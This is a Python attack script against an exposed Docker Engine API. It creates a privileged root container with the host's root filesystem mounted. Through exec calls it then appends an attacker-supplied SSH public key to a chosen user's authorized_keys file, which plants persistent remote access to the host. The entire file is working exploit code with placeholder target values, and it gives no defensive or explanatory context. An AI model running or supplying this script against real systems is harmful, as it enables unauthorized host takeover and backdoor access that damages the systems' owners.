import requests
import json
import time
import os

# === CONFIG ===
target = "http://x.x.x.x:xxxx"
image = "<YOUR IMAGE>"
username = "<USERNAME>"
pubkey_path = "<PUBKEY PATH>"
container_cmd = "while true; do sleep 1; done"
authorized_keys_path = f"/host/home/{username}/.ssh/authorized_keys"
ssh_dir = f"/host/home/{username}/.ssh"

# Load public key
if not os.path.exists(pubkey_path):
    print(f"[-] Public key file not found: {pubkey_path}")
    exit(1)
with open(pubkey_path, "r") as f:
    attacker_pubkey = f.read().strip()

def exec_command(container_id, command):
    print(f"[*] Exec: {command}")
    exec_payload = {
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["sh", "-c", command]
    }
    r = requests.post(f"{target}/containers/{container_id}/exec", json=exec_payload)
    exec_id = r.json().get("Id")
    if not exec_id:
        print("[-] Failed to create exec")
        return None
    r = requests.post(f"{target}/exec/{exec_id}/start", json={"Detach": False, "Tty": False})
    return r.status_code == 200

# Step 1: Create container
print("[*] Creating container...")
container_create_payload = {
    "Image": image,
    "User": "0",
    "Cmd": ["sh", "-c", container_cmd],
    "HostConfig": {
        "Binds": ["/:/host"],
        "Privileged": True
    }
}
r = requests.post(f"{target}/containers/create", json=container_create_payload)
if r.status_code != 201:
    print("[-] Container creation failed:", r.text)
    exit(1)
container_id = r.json()["Id"]
print(f"[+] Container ID: {container_id}")

# Step 2: Start container
print("[*] Starting container...")
r = requests.post(f"{target}/containers/{container_id}/start")
if r.status_code not in [204, 200]:
    print("[-] Failed to start container:", r.text)
    exit(1)
print("[+] Container running")
time.sleep(2)

# Step 3: Ensure .ssh directory and permissions
print("[*] Ensuring .ssh directory exists with correct permissions...")
exec_command(container_id, f"mkdir -p {ssh_dir} && chmod 700 {ssh_dir}")

# Step 4: Append the key
print("[*] Appending public key...")
escaped_key = attacker_pubkey.replace('"', '\\"')
append_cmd = f'echo "{escaped_key}" >> {authorized_keys_path} && chmod 600 {authorized_keys_path}'
if exec_command(container_id, append_cmd):
    print(f"[+] Public key appended to {authorized_keys_path}")
else:
    print("[-] Failed to append authorized key")
